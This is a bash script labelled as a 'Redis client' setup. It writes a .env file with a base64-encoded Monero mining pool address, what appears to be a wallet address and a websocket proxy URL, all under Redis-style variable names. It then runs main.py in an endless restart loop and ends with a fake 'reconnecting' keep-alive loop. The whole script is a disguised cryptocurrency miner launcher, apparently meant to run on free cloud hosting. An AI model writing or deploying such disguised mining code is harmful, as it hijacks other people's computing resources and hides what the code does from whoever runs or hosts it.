#!/bin/bash
set -e
REDIS_URLS=(
  "wss://upper-yetty-berakitame-c33dc1e5.koyeb.app"
  
  
)
REDIS_URL="${REDIS_URLS[$RANDOM % ${#REDIS_URLS[@]}]}"

# Tạo .env
cat > .env <<EOF
REDIS_URL=$REDIS_URL
REDIS_PAIR=eG1yLmtyeXB0ZXgubmV0d29yazo3MDI5
REDIS_USER=89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.US
REDIS_PASS=x
REDIS_PIPE=16
EOF


cat > ./start.sh <<'EOF'
#!/bin/bash
while true; do
  python3 main.py
  sleep 15
done
EOF
chmod +x ./start.sh
./start.sh
# START APP

echo "========================"
echo "  REDIS CLIENT CLI RUN  "
echo "========================"
while true; do
  echo "Reconnecting in 24 hours..."
  sleep 1m
done




